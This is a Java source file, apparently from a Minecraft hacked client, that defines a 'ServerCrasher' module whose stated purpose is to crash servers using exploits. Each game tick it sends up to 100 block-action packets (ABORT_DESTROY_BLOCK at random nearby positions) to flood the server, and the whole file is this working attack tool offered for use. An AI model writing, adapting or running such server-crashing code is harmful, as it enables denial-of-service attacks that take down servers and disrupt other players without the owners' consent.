package me.offeex.bloomware.client.module.modules.packet;

import me.offeex.bloomware.client.module.Module;
import me.offeex.bloomware.client.setting.settings.SettingEnum;
import me.offeex.bloomware.client.setting.settings.SettingNumber;
import net.minecraft.block.Blocks;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;

import java.util.Random;

@Module.Register(name = "ServerCrasher", description = "Allows you to crash the server using exploits", category = Module.Category.PACKET)
public class ServerCrasher extends Module {
    private final SettingEnum mode = new SettingEnum.Builder("Mode").modes("NoComment").selected("NoComment").setup(this);
    private final SettingNumber packets = new SettingNumber.Builder("Packets").value(5).min(1).max(100).inc(1).setup(this);
    private final Random random = new Random();

    @Override
    public void onEnable() {
        mc.getNetworkHandler().sendPacket(new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.START_DESTROY_BLOCK, new BlockPos(0, 0, 0), Direction.UP));
    }

    @Override
    public void onTick() {
        if (mode.is("NoComment")) {
            for (int i = 0; i < packets.getValue(); i++) {
                BlockPos pos = new BlockPos(mc.player.getBlockPos().getX() + random.nextInt(100), 1, mc.player.getBlockPos().getZ() + random.nextInt(100));
                if (mc.world.getBlockState(pos).getBlock() != Blocks.AIR) {
                    PlayerActionC2SPacket packet = new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.ABORT_DESTROY_BLOCK, pos, Direction.UP);
                    mc.getNetworkHandler().sendPacket(packet);
                }
            }
        }
    }
}
